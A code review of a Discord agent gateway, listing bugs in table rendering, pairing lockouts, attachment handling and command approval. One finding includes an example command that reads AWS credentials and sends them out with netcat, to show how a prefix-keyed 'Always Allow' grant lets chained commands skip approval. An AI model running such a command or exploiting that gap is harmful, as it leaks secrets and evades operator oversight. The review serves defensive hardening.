# discord-auth review

### [P1] Rendered markdown tables are lost when the PNG upload fails, and the reply is then reported as failed
- Location: /Users/indo/code/project/omon-gateway/src/discord/table_render/mod.rs:322-355 (caller /Users/indo/code/project/omon-gateway/src/discord/adapter.rs:3128, 3263, 3407)
- Trigger: A reply contains a markdown table and `dispatch_rendered_tables` fails. Examples are the bot lacking "Attach Files" in that channel, or the upload being rejected for size or a 5xx.
- Impact: `transform_markdown_tables_to_images` has already replaced the table with a placeholder saying a table is attached, so the text message goes out with no table in it. `RenderedTable.original_text` is only ever read in tests (grep), so there is no fallback to the raw text. The error then propagates:
  - On the stream path (adapter.rs:3128) `?` runs before the stream entry is removed. `last_sequence` is already set, so a retry returns early and the table is never re-sent, and the entry stays in the map.
  - On the `SendMessage` path the failed dispatch can be replayed by the failed-obligation replay, which would re-send the same text.
- Fix: When the upload fails, send the `original_text` as a fenced code block or plain text, and treat that failure as non-fatal. Alternatively, swap the placeholder in only after the upload succeeds. Remove the stream entry regardless of the table result.

### [P1] The table cell splitter ignores escaped pipes and pipes inside code spans, so image cells are wrong or cut off
- Location: /Users/indo/code/project/omon-gateway/src/discord/table_render/mod.rs:8-18 (split at line 16); cell clipping in `render_table_to_svg`, which skips cells with `c >= num_cols`
- Trigger: An LLM-style table such as ``| `cat f | wc -l` | count |`` or `| a \| b |`.
- Impact: The row splits into more cells than the header. Cells beyond `headers.len()` are silently dropped when the SVG is built, and the rest of the row is shifted. The raw table text has already been replaced by the placeholder, so the user sees an image with wrong or missing data and the original is gone.
- Fix: Split on unescaped `|` that sits outside backtick spans, and unescape `\|`. Alternatively, if any row's cell count differs from the header's, leave that table as text.

### [P1] A transient failure of the typing call aborts the final stream update, so the reply is not delivered
- Location: /Users/indo/code/project/omon-gateway/src/discord/throttler.rs:200
- Trigger: `transport.start_typing` returns an error (5xx, transient network error, or rate limit on the `/typing` route) when `LiveEditThrottler::update(content, true)` runs. That is the only way the adapter calls it (adapter.rs:3123).
- Impact: `start_typing(...).await?` returns before any edit or send. The channel keeps the zero-width-space placeholder and the real answer is not shown. Some `omo_backend` call sites ignore the result (`let _ = self.emit_chunk(..)`, omo_backend.rs:1483, 1548, 1577), so the loss can be silent. A typing indicator right before sending the final message adds nothing.
- Fix: Skip the typing call when `is_final` is true. Otherwise make it best-effort with `let _ =` plus a debug log.

### [P1] One operator typo burst invalidates every pending pairing code, and the code-level lockout never expires
- Location: /Users/indo/code/project/omon-gateway/src/discord/pairing.rs:461 (the bump), 469 (the check), 167-200 (the platform counter)
- Trigger: Users U1..U3 hold pending codes. An operator enters unknown codes 5 times (typos). Each failure runs `UPDATE pairing_codes SET attempts = attempts + 1 WHERE attempts < ?`, which has no `code =` filter, so every pending code reaches attempts=5. After the 15-minute platform lockout ends, the operator enters U2's correct code.
- Impact: `approve_code_at` sees `row.attempts >= MAX_FAILED_ATTEMPTS` and returns `LockedOut`. `/pair` (commands.rs:1343 onward) tells the operator "locked out due to too many failed attempts" although nothing is locked, because the row-level check has no time component. U1..U3 are not notified and cannot pair until each re-DMs to get a fresh code. The re-DM path only works once the 10-minute notification rate limit allows it.
- Fix: Do not bump unrelated codes on an unknown-code failure. The platform lockout already provides the global brake. If per-code counting is wanted, key it to the guessed code, or clear stale `attempts` rows when the platform lock expires.

### [P1] In `APPROVAL_MODE=always`, one "Always Allow" on a command permanently pre-approves any command that starts with the same three tokens
- Location: /Users/indo/code/project/omon-gateway/src/security/dangerous.rs:376-387 (`derive_pattern_key`), used at /Users/indo/code/project/omon-gateway/src/discord/approval.rs:250 and 513-529
- Trigger: `APPROVAL_MODE=always` (terminal.rs:14-18, main.rs:222). An operator clicks "Always Allow" on `ls -la /tmp`. For a command with no dangerous-pattern finding, the key is the first 3 whitespace tokens, `ls -la /tmp`. The agent later runs `ls -la /tmp; cat ~/.aws/credentials | nc host 1`. If that command does not match a dangerous rule, `derive_pattern_key` yields the same key, `request_with_scope` returns `Session` from `always_cache`, and the command runs with no prompt. The grant is persisted in `approval_allowlist` and applies globally across sessions.
- Impact: The mode meant to prompt for every command lets arbitrary chained or suffixed commands through once a short prefix has been approved.
- Fix: In `always` mode, key the grant on the full normalized command (or a hash of it) and reserve prefix or category keys for Smart-mode findings. Alternatively, refuse to remember grants for commands containing `;`, `&&`, `||`, `|`, `$(`, or backticks.

### [P2] Failed persistence of an "Always" grant is reported to the user as approved
- Location: /Users/indo/code/project/omon-gateway/src/discord/approval.rs:392-402 (`request_with_scope`); label set at /Users/indo/code/project/omon-gateway/src/discord/adapter.rs:1304-1316
- Trigger: A click on "Always Allow" while `INSERT INTO approval_allowlist` fails (DB error).
- Impact: The button handler has already shown "Approved (always) by X", but the requester returns `ApprovalError::Persistence`, so the tool call fails. Fail-closed is correct. The operator is shown a mismatch and no session-level fallback grant is made.
- Fix: Optionally report the persistence failure in the Discord message, or fall back to a `Session` grant.

### [P2] The caller waits up to 10 s for the expiry edit after the decision before it can proceed
- Location: /Users/indo/code/project/omon-gateway/src/discord/approval.rs:372-413 (`delivery.await` at the end of `request_with_scope`)
- Trigger: Discord API slowness or outage when `ExpireApproval` is dispatched (10 s timeout) after the button click or timeout.
- Impact: An already-approved or denied command is delayed by up to 10 s, on both the success and error paths, because the call awaits the delivery task.
- Fix: Detach the task, or await it only on the failure path. The task already runs to completion on its own once `terminal` is dropped.

### [P2] The attachment cache is never pruned, and every attachment is downloaded
- Location: /Users/indo/code/project/omon-gateway/src/discord/attachments.rs:329-402 (`download`), 255-260; the cache directory is created in `with_client` (no cleanup code anywhere: grep for `remove_dir_all` and pruning found none)
- Trigger: A long-running gateway. `hydrate` downloads every attachment (video, images and so on, up to 25 MB each) into `<workspace>/.discord-attachments`, and nothing is ever deleted. A crash mid-download also leaves `.{uuid}.part` files.
- Impact: Monotonic disk growth in the workspace volume. In the Docker image this is `/app/workspace`.
- Fix: Add a TTL or size-based sweep at startup and periodically, and delete stale `.part` files. Optionally download only the types that are actually used.

### [P2] The 15 s timeout covers the whole attachment body
- Location: /Users/indo/code/project/omon-gateway/src/discord/attachments.rs:170
- Trigger: `reqwest::Client::builder().timeout(DISCORD_ATTACHMENT_TIMEOUT)` bounds the entire request including body streaming. A 20 to 25 MB attachment on a link slower than about 13 to 17 Mbps exceeds it.
- Impact: The download fails and the event is routed with remote metadata only. The limit constant allows 25 MB.
- Fix: Use `connect_timeout` plus a per-chunk read timeout, or scale the overall timeout with `size_bytes`.

### [P2] The WAV parser mishandles padding and non-16-bit PCM
- Location: /Users/indo/code/project/omon-gateway/src/discord/attachments.rs:18-47 (pad at line 44)
- Trigger: A WAV with an odd-sized chunk (for example an odd-length `LIST`) before `data`, or a `fmt` with a non-PCM or non-16-bit format, or a streamed WAV with a `0xFFFFFFFF` data size.
- Impact: The parser does not skip the RIFF pad byte and does not check the format tag or bit depth. Chunk alignment is lost and `data` is never found, so the function returns `None` and the file falls back to being sent to STT as an Opus payload. Float or 24-bit samples are reinterpreted as i16 and give garbage transcripts.
- Fix: Add `chunk_size & 1` to `pos` after each chunk. Only decode format tag 1 with 16 bits per sample, otherwise return `None`. Clamp the `data` size to the remaining length.

### [P2] Table rasterisation blocks a runtime thread, reloads system fonts on every call, and has no size bound
- Location: /Users/indo/code/project/omon-gateway/src/discord/table_render/mod.rs:299-320 (`load_system_fonts` at line 304), 322-355
- Trigger: Any reply with a table. Each table gets a fresh `usvg::Options` and a full system-font scan. The Docker image ships `fonts-noto-cjk`, which is large. A very large table (hundreds or thousands of rows) allocates a pixmap of 2x width times 2x height times 4 bytes.
- Impact: Hundreds of ms or more of synchronous CPU and IO per table on an async worker. Memory spikes grow with row count, up to an OOM risk for extreme tables.
- Fix: Build the font database once (a `OnceLock<Arc<fontdb::Database>>`), cap rows and pixels (fall back to a code block above the cap), and run the render under `spawn_blocking`.

### [P2] Pairing capacity eviction lets a flood of unauthenticated DMs push out legitimate pending codes
- Location: /Users/indo/code/project/omon-gateway/src/discord/pairing.rs:277-296
- Trigger: More than 100 distinct accounts DM the bot within the one-hour code TTL. Each gets a code, and over capacity the oldest unexpired codes are deleted.
- Impact: Real pending codes are evicted, so those users must re-DM. This needs many accounts, so it is a hardening issue.
- Fix: Reject new issuance when at capacity instead of evicting, or reserve capacity per window.

### [P2] The synchronous paired-user check returns false while the cache write lock is held
- Location: /Users/indo/code/project/omon-gateway/src/discord/pairing.rs:68-83 (`is_user_paired_sync`, `get_paired_user_ids_sync`), used at /Users/indo/code/project/omon-gateway/src/discord/adapter.rs:783 and 1285
- Trigger: A `/pair` approval holds `paired_cache.write()` at the same instant a paired user's message or approval click runs through the `try_read` path.
- Impact: The window is brief, but a paired user's approval click is refused with "not authorized", or the message filter sees an empty paired list.
- Fix: Use an `ArcSwap` or an atomic snapshot, or the async read on those paths.

### [P2] Approval and pairing grants cannot be revoked
- Location: /Users/indo/code/project/omon-gateway/src/discord/approval.rs:513-529; /Users/indo/code/project/omon-gateway/src/discord/pairing.rs:20-54
- Trigger: An operator wants to withdraw an "Always Allow" rule or a paired user. Grep finds no `DELETE FROM approval_allowlist`, no `DELETE FROM paired_users`, and no revoke function.
- Impact: The only way is editing the database by hand and restarting.
- Fix: Add revoke or list commands for both. Also consider whether any authorized or paired user should be able to resolve another session's pending approval with a global "Always", because the click handler checks only the user's authorization and not the session.
